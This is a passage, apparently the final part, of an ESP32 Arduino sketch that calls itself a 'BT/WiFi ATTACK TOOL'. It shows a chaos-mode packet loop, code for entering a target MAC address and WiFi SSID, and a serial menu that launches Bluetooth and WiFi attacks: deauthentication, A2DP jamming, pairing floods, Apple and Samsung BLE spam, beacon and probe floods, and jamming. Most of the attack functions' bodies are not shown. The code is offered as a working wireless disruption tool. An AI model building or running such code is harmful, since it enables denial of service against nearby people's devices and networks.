            delay(30);
            BLEDevice::stopAdvertising();
        }
        
        packetCount += 4;
        
        if (millis() - attackStart > 3000) {
            Serial.printf("[*] CHAOS: %lu total packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    BLEDevice::deinit(true);
    Serial.println(F("\n[*] Chaos mode deactivated\n"));
}

// ==================== SET TARGET ====================
void cmd_SetTargetMAC() {
    Serial.println(F("\n[*] Enter target MAC (AA:BB:CC:DD:EE:FF):"));
    while (!Serial.available()) delay(10);
    
    String mac = Serial.readStringUntil('\n');
    mac.trim();
    mac.toUpperCase();
    
    if (mac.length() == 17 && mac[2] == ':') {
        targetMAC = mac;
        Serial.printf("[*] Target MAC set: %s\n", targetMAC.c_str());
        
        Serial.println(F("[*] Enter target name (optional, Enter to skip):"));
        delay(1000);
        if (Serial.available()) {
            String name = Serial.readStringUntil('\n');
            name.trim();
            if (name.length() > 0) {
                targetName = name;
                Serial.printf("[*] Target name: %s\n", targetName.c_str());
            }
        }
    } else {
        Serial.println(F("[!] Invalid MAC format"));
    }
}

void cmd_SetTargetSSID() {
    Serial.println(F("\n[*] Enter target WiFi SSID:"));
    while (!Serial.available()) delay(10);
    
    String ssid = Serial.readStringUntil('\n');
    ssid.trim();
    
    if (ssid.length() > 0) {
        targetSSID = ssid;
        Serial.printf("[*] Target SSID set: %s\n", targetSSID.c_str());
    }
}

// ==================== HELPER ====================
void checkSerialStop() {
    if (Serial.available()) {
        char c = Serial.read();
        if (c == 'x' || c == 'X') {
            attacking = false;
        }
    }
}

// ==================== SETUP ====================
void setup() {
    Serial.begin(SERIAL_BAUD);
    pinMode(LED_PIN, OUTPUT);
    
    delay(1000);
    
    // Boot animation
    for (int i = 0; i < 5; i++) {
        digitalWrite(LED_PIN, HIGH);
        delay(100);
        digitalWrite(LED_PIN, LOW);
        delay(100);
    }
    
    Serial.println(F("\n*** ESP32 BT/WiFi ATTACK TOOL v2 MEGA ***"));
    Serial.println(F("*** Ready. Press M for menu. ***\n"));
}

// ==================== LOOP ====================
void loop() {
    if (Serial.available()) {
        char c = Serial.read();
        c = toupper(c);
        
        switch (c) {
            case '1': cmd_BLEScan(); break;
            case '2': cmd_BTClassicScan(); break;
            case '3': cmd_BLEDeauth(); break;
            case '4': cmd_A2DPJam(); break;
            case '5': cmd_PairingFlood(); break;
            case '6': cmd_BLESpamApple(); break;
            case '7': cmd_BLESpamSamsung(); break;
            case '8': cmd_BLESpamAll(); break;
            case '9': cmd_BTChannelHopper(); break;
            case 'A': cmd_WiFiScan(); break;
            case 'B': cmd_WiFiDeauth(); break;
            case 'C': cmd_WiFiBeaconFlood(); break;
            case 'D': cmd_WiFiProbeFlood(); break;
            case 'E': cmd_WiFiJammer(); break;
            case 'F': cmd_DualAttack(); break;
            case 'G': cmd_ChaosMode(); break;
            case 'S': cmd_SetTargetMAC(); break;
            case 'T': cmd_SetTargetSSID(); break;
            case 'X': attacking = false; Serial.println(F("[*] All attacks stopped")); break;
            case 'M': showMenu(); break;
            case 'I': showSystemInfo(); break;
        }
    }
    
    // LED indicator
    if (attacking) {
        digitalWrite(LED_PIN, HIGH);
        delay(50);
        digitalWrite(LED_PIN, LOW);
        delay(50);
    } else {
        digitalWrite(LED_PIN, HIGH);
        delay(1000);
        digitalWrite(LED_PIN, LOW);
        delay(1000);
    }
}
